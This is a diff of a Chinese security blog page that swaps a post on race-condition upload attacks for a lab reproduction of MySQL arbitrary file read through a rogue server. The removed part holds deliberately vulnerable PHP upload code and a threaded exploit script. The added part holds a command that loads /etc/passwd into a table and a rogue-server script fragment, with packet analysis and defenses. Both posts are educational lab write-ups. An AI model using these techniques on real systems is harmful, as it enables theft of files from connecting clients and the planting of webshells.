@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Conditional Competitive Learning | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Conditional Competitive Learning | 九世的博客">
+  <title>mysql任意文件读取复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="mysql任意文件读取复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区">
 <meta property="og:type" content="website">
@@ -1128,9 +1128,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Conditional-Competitive-Learning" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-mysql任意文件读取复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Conditional Competitive Learning</h1>
+        <h1 class="article-title">mysql任意文件读取复现</h1>
     
     <div class="article-meta">
         
@@ -1139,14 +1139,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-03-24 14:34</time>
+        创建时间:<time class="date" title="更新时间: 2019-11-01 00:29:33">2019-10-31 23:39</time>
         
     </div>
     <div class="article-meta">
@@ -1168,7 +1168,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#条件竞争"><span class="toc-text">条件竞争</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验步骤"><span class="toc-text">实验步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可利用的地方"><span class="toc-text">可利用的地方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#从流量角度去看"><span class="toc-text">从流量角度去看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御手段"><span class="toc-text">防御手段</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1183,72 +1183,51 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>准备上学，抽时间学了条件竞争并做了笔记<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181109/eefcba0df71b4ca18385a0152f51106a.jpeg" alt="eefcba0df71b4ca18385a0152f51106a.jpeg"></p>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p><b>0x00介绍</b><br>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含webshell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作)，攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击</p>
-<p><b>0x01漏洞一般出现的位置</b><br>SRC好像都没见过，一般出现在CTF题吧<br>就是允许任意文件上传，但是会判断是否为webshell。更简洁的来说就是：</p>
-<pre><code>先将文件上传到指定目录然后在判断是否为webshell，是的话在删除。攻击者可以利用这段时间差来进行生成另一个shell。
-一般存在条件竞争的上传文件后，在短暂时间内发现可以访问。可是后面就被删了，这就有：条件竞争
-</code></pre><p><b>0x02实验</b><br>存在漏洞的代码</p>
-<pre><code class="php">&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;条件竞争&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;form action=&quot;demo.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
-    &lt;label for=&quot;file&quot;&gt;文件名&lt;/label&gt;
-    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; na=&quot;submit&quot; value=&quot;上传&quot;&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早上在在群内看见几条链接，一打开骚瞎了眼睛。利用mysql的任意文件读取+黑名单文件上传硬生生草出一个webshell<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1572546676675&amp;di=7115be36c38130f2ccb0227bab864196&amp;imgtype=0&amp;src=http%3A%2F%2Fi1.hdslb.com%2Fbfs%2Farchive%2F0753cfc4a64c7530fc7f6aff85fbd95c8406f7c9.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1572546676675&amp;di=7115be36c38130f2ccb0227bab864196&amp;imgtype=0&amp;src=http%3A%2F%2Fi1.hdslb.com%2Fbfs%2Farchive%2F0753cfc4a64c7530fc7f6aff85fbd95c8406f7c9.jpg"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1426503" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1426503</a><br><a href="https://xz.aliyun.com/t/6587" target="_blank" rel="noopener">https://xz.aliyun.com/t/6587</a><br><a href="https://github.com/allyshka/Rogue-MySql-Server/" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server/</a></p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><pre><code>Kali:192.168.1.106 客户端
+Windows 7:192.168.1.105 服务端
+</code></pre><p>根据文章中，先使用kali里的mysql连接windows 7上的mysql。执行以下命令</p>
+<pre><code>mysql -h 192.168.1.105 -u root -p -D gss -e&quot;load data local infile &#39;/etc/passwd&#39; into table demo fields terminated by &#39;,&#39;&quot;;
+</code></pre><p>执行完之后发现，/etc/passwd里的内容被保存在gss数据库里的demo表里<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htq0ktc0j30it0nuabg.jpg" alt="006LG7Nygy1g8htq0ktc0j30it0nuabg.jpg"></p>
+<p>会存储到服务端的原因是<br>mysql客户端并不会将数据存储，而是响应在服务端里<br><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/x5czq3hdar.jpeg?imageView2/2/w/1620" alt="1620"></p>
+<p>然后使用给出的exp，创建一个流氓mysql服务端，在kali执行。然后使用windows 7链接，来读取桌面上的test.txt<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htrb04ctj31400gv0ul.jpg" alt="006LG7Nygy1g8htrb04ctj31400gv0ul.jpg"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htrspqwnj30th0a10sw.jpg" alt="006LG7Nygy1g8htrspqwnj30th0a10sw.jpg"></p>
+<p>然后使用Navicat来连接恶意的mysql<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htsk9ugyj318g0p076j.jpg" alt="006LG7Nygy1g8htsk9ugyj318g0p076j.jpg"></p>
+<p>当连接成功后，查看生成的mysql.og可以看到读取的内容<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htt7dyn6j30sb0lqwgs.jpg" alt="006LG7Nygy1g8htt7dyn6j30sb0lqwgs.jpg"></p>
+<p>如果在rogue_mysql_server.py设置了读取多个文件，那么得执行几条查询语句。才会引动服务端那边的查询请求</p>
+<pre><code class="python">import logging.handlers
 
-&lt;?php
-header(&quot;Content-Type: text/html;charset=utf-8&quot;);
-if(isset($_FILES[&#39;file&#39;])) {
-    if ($_FILES[&#39;file&#39;][&#39;error&#39;] &gt; 0) {
-        echo &quot;文件上传错误&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;
-    } else {
-        echo &quot;上传的文件名:&quot; . $_FILES[&#39;file&#39;][&#39;name&#39;] . &quot;&lt;br&gt;&quot;;
-        echo &quot;文件类型:&quot; . $_FILES[&#39;file&#39;][&#39;type&#39;] . &quot;&lt;br&gt;&quot;;
-        echo &quot;文件大小:&quot; . $_FILES[&#39;file&#39;][&#39;size&#39;] . &quot;&lt;br&gt;&quot;;
-        echo &quot;文件临时存储位置&quot;.$_FILES[&#39;file&#39;][&#39;tmp_name&#39;].&quot;&lt;br&gt;&quot;;
-        move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;upload/&#39; . $_FILES[&#39;file&#39;][&#39;name&#39;]);
-        $demo=explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;]);
-        $hz=end($demo);
-        sleep(10);
-        if ($hz!=&#39;jpg&#39;){
-            unlink(&#39;upload/&#39;.$_FILES[&#39;file&#39;][&#39;name&#39;]);
-            echo &quot;发现webshell，已删除&quot;;
-        }
-    }
-}
-?&gt;
+
+
+PORT = 3306
+
+log = logging.getLogger(__name__)
+
+log.setLevel(logging.INFO)
+tmp_format = logging.handlers.WatchedFileHandler(&#39;mysql.log&#39;, &#39;ab&#39;)
+tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))
+log.addHandler(
+    tmp_format
+)
+
+filelist = (
+    &#39;C:\\Users\\jiushi\\Desktop\\test.txt&#39;,
+)
 </code></pre>
-<p>poc</p>
-<pre><code class="python">import requests
-import threading
-
-s = 0
-def demo(url):
-    global s
-    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;}
-    rqt=requests.get(url=url,headers=headers)
-    s+=1
-    print(&#39;[+] 已请求:{}次&#39;.format(s))
-    rqt=requests.get(url=&#39;http://127.0.0.1/jinz/upload/xxx.php&#39;,headers=headers)
-    if rqt.status_code==200:
-        print(&#39;[+] shell上传成功&#39;)
-
-if __name__ == &#39;__main__&#39;:
-    urls=&#39;http://127.0.0.1/jinz/upload/xx.php&#39;
-    for i in range(1,30):
-        t=threading.Thread(target=demo,args=(urls,))
-        t.start()
-</code></pre>
-<p>  <img src="https://s2.ax1x.com/2019/03/24/AYQxqH.md.png" alt=""></p>
-<p>  <img src="https://s2.ax1x.com/2019/03/24/AYlSZd.md.png" alt="AYlSZd.md.png"></p>
-<p>  <img src="https://s2.ax1x.com/2019/03/24/AYlpdA.md.png" alt="AYlpdA.md.png"></p>
-<p>  <b>0x003修复</b><br>  针对此漏洞修复是，要判断是否为允许后缀在上传的过程判断，不要上传完毕才判断<br>  对上传后的文件进行重命名</p>
-<p>  转载请声明：转自422926799.github.io</p>
+<p>当我们尝试读取一个不存在的文件时，连接mysql的客户端（Navicat）可以看到。有读取的请求操作<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htz8irafj318g0p076z.jpg" alt="006LG7Nygy1g8htz8irafj318g0p076z.jpg"></p>
+<p>读取到的hosts文件<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hu11rcjwj318z0pidjv.jpg" alt="006LG7Nygy1g8hu11rcjwj318z0pidjv.jpg"></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由于mysql客户端对服务端有着绝对信任的理由。导致攻击机可以构造一个恶意服务端，在连接的时候发送读取文件的请求，然后返回的结果会被记录到mysql.log</p>
+<h2 id="可利用的地方"><a href="#可利用的地方" class="headerlink" title="可利用的地方"></a>可利用的地方</h2><p>当web上有类似于phpmyadmin或其他mysql连接的功能。可以利用这个漏洞做个突破点</p>
+<h2 id="从流量角度去看"><a href="#从流量角度去看" class="headerlink" title="从流量角度去看"></a>从流量角度去看</h2><p>第一个包，显示mysql的数据库版本<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hu7wnvsoj30vm0fs41f.jpg" alt="006LG7Nygy1g8hu7wnvsoj30vm0fs41f.jpg"></p>
+<p>验证数据库用户<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hu97o5qrj311j0ha0w8.jpg" alt="006LG7Nygy1g8hu97o5qrj311j0ha0w8.jpg"></p>
+<p>代表用户成功认证<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8huacdhbbj30yf0g7acw.jpg" alt="006LG7Nygy1g8huacdhbbj30yf0g7acw.jpg"></p>
+<p>设置编码<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8huclqqmej30yw0fygoe.jpg" alt="006LG7Nygy1g8huclqqmej30yw0fygoe.jpg"></p>
+<p>重点来了，读取文件的请求（可以看出这里是，效验成功后，设置完编码，mysql服务端发出的一个文件读取请求）<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hudsa2pbj31110lc42n.jpg" alt="006LG7Nygy1g8hudsa2pbj31110lc42n.jpg"></p>
+<p>返回读取文件的内容给服务端<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hufbl4fzj310t0ontdz.jpg" alt="006LG7Nygy1g8hufbl4fzj310t0ontdz.jpg"></p>
+<p>脚本的思路是：<br>1.伪造是自己mysql服务端<br>2.当client连接上后<br>3.发送一个读取文件的请求<br>4.返回读取文件的内容</p>
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>避免使用 local读取本地文件<br>使用 –ssl-mode=VERIFY_IDENTITY来建立可信的连接（参考链接<a href="https://blog.csdn.net/weixin_39845407/article/details/81708230" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39845407/article/details/81708230</a>  ）</p>
+<p>现实中做SSL认证连接的，可能也就20%吧。说不定连20%也没有…</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1258,12 +1237,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Conditional Competitive Learning</p>
+    <p><span class="copy-title">文章标题:</span>mysql任意文件读取复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-03-24, 14:34:11</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/2d4f21a3.html" title="Conditional Competitive Learning">http://422926799.github.io/posts/2d4f21a3.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-31, 23:39:03</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-01, 00:29:33</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5bed3da8.html" title="mysql任意文件读取复现">http://422926799.github.io/posts/5bed3da8.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
